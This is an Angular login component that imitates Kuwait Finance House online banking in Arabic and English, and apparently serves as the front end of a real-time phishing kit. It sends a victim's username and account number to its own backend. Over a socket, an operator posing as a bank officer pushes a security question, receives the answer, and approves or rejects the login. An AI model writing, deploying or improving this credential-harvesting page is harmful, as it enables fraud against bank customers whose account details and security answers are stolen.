import { Component, OnInit, OnDestroy, NgZone, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { ButtonComponent } from '../../shared/components/button/button';
import { InputComponent } from '../../shared/components/input/input';
import { HeaderComponent } from '../../shared/components/header/header';
import { io } from 'socket.io-client';
import { API_BASE } from '../../shared/config';

type LoginStep = 'CREDENTIALS' | 'WAITING_QUESTION' | 'ANSWER_QUESTION' | 'WAITING_APPROVAL' | 'APPROVED' | 'REJECTED';

@Component({
  selector: 'app-login',
  standalone: true,
  imports: [CommonModule, FormsModule, ButtonComponent, InputComponent, HeaderComponent],
  templateUrl: './login.html',
  styleUrl: './login.css',
})
export class LoginComponent implements OnInit, OnDestroy {
  private ngZone = inject(NgZone);

  // State machine fields as Signals for Zoneless reactive change detection
  username = signal('');
  accountNumber = signal('');
  step = signal<LoginStep>('CREDENTIALS');
  clientId = signal('');
  assignedQuestion = signal('');
  answer = signal('');
  loading = signal(false);
  errorMessage = signal('');

  lang: 'ar' | 'en' = 'ar';
  private socket: any;

  // Translation resources
  translations = {
    ar: {
      title: 'الدخول',
      usernameLabel: 'اسم المستخدم',
      usernamePlaceholder: 'ادخل اسم المستخدم',
      accountLabel: 'رقم الحساب',
      accountPlaceholder: 'ادخل رقم الحساب',
      help: 'مساعدة للدخول',
      next: 'التالي',
      register: 'التسجيل',
      waitingQuestion: 'يرجى الانتظار حتى يقوم موظف البنك بتحديد سؤال الأمان الخاص بك للمتابعة...',
      waitingApproval: 'جاري التحقق من إجابتك، يرجى الانتظار للموافقة على الدخول من قبل موظف البنك...',
      approvedTitle: 'تم تسجيل الدخول بنجاح!',
      approvedSubtitle: 'مرحباً بك في الخدمات المصرفية الإلكترونية لبيت التمويل الكويتي.',
      rejectedTitle: 'تم رفض الدخول',
      rejectedSubtitle: 'لقد تم رفض إجابتك من قبل موظف البنك. يرجى المحاولة مرة أخرى.',
      retryBtn: 'إعادة المحاولة',
      answerPlaceholder: 'أدخل الإجابة هنا',
      submitAnswer: 'إرسال الإجابة',
      verificationPrompt: 'يرجى الاجابة على السؤال للمتابعة'
    },
    en: {
      title: 'Login',
      usernameLabel: 'Username',
      usernamePlaceholder: 'Enter username',
      accountLabel: 'Account Number',
      accountPlaceholder: 'Enter account number',
      help: 'Help with login',
      next: 'Next',
      register: 'Register',
      waitingQuestion: 'Please wait while the bank officer assigns your security question to continue...',
      waitingApproval: 'Verifying your answer, please wait for login approval from the bank officer...',
      approvedTitle: 'Logged in successfully!',
      approvedSubtitle: 'Welcome to KFH Online banking services.',
      rejectedTitle: 'Login Rejected',
      rejectedSubtitle: 'Your answer has been rejected by the bank officer. Please try again.',
      retryBtn: 'Try Again',
      answerPlaceholder: 'Enter answer here',
      submitAnswer: 'Submit Answer',
      verificationPrompt: 'Please answer the question to continue'
    }
  };

  get t() {
    return this.translations[this.lang];
  }

  get isFormValid(): boolean {
    if (this.step() === 'CREDENTIALS') {
      return this.username().trim().length > 0 && this.accountNumber().trim().length > 0;
    }
    if (this.step() === 'ANSWER_QUESTION') {
      return this.answer().trim().length > 0;
    }
    return false;
  }

  ngOnInit(): void {
    this.updateDirection();
  }

  ngOnDestroy(): void {
    this.disconnectSocket();
  }

  onLangChange(newLang: 'ar' | 'en'): void {
    this.lang = newLang;
    this.updateDirection();
  }

  private updateDirection(): void {
    if (typeof document !== 'undefined') {
      document.documentElement.dir = this.lang === 'ar' ? 'rtl' : 'ltr';
      document.documentElement.lang = this.lang;
    }
  }

  async onSubmit(): Promise<void> {
    if (!this.isFormValid) return;

    this.loading.set(true);
    this.errorMessage.set('');

    try {
      if (this.step() === 'CREDENTIALS') {
        const response = await fetch(`${API_BASE}/user/client/start`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: this.username(), accountNumber: this.accountNumber() })
        });

        const data = await response.json();
        if (!response.ok) throw new Error(data.message || 'فشلت عملية الدخول');

        this.clientId.set(data.clientId);
        this.step.set('WAITING_QUESTION');
        this.initializeSocketConnection();
      } else if (this.step() === 'ANSWER_QUESTION') {
        const response = await fetch(`${API_BASE}/user/client/answer`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ clientId: this.clientId(), answer: this.answer() })
        });

        const data = await response.json();
        if (!response.ok) throw new Error(data.message || 'فشل إرسال الإجابة');

        this.step.set('WAITING_APPROVAL');
      }
    } catch (err: any) {
      this.errorMessage.set(err.message || 'حدث خطأ أثناء الاتصال بالخادم');
    } finally {
      this.loading.set(false);
    }
  }

  private initializeSocketConnection(): void {
    this.disconnectSocket();

    console.log('Connecting to WebSocket server...');
    this.socket = io(API_BASE);

    this.socket.on('connect', () => {
      console.log('WebSocket connected. Joining client room:', this.clientId());
      this.socket.emit('join', this.clientId());
    });

    this.socket.on('status_change', (data: any) => {
      console.log('Socket status change event received:', data);
      
      this.ngZone.run(() => {
        if (data.status === 'WAITING_ANSWER') {
          this.assignedQuestion.set(data.question);
          this.step.set('ANSWER_QUESTION');
        } else if (data.status === 'ANSWERED') {
          this.step.set('WAITING_APPROVAL');
        } else if (data.status === 'APPROVED') {
          this.step.set('APPROVED');
          this.disconnectSocket();
        } else if (data.status === 'REJECTED') {
          this.step.set('REJECTED');
          this.disconnectSocket();
        }
      });
    });

    this.socket.on('disconnect', () => {
      console.log('WebSocket disconnected.');
    });
  }

  private disconnectSocket(): void {
    if (this.socket) {
      this.socket.disconnect();
      this.socket = null;
    }
  }

  retry(): void {
    this.disconnectSocket();
    this.step.set('CREDENTIALS');
    this.clientId.set('');
    this.assignedQuestion.set('');
    this.answer.set('');
    this.errorMessage.set('');
  }
}


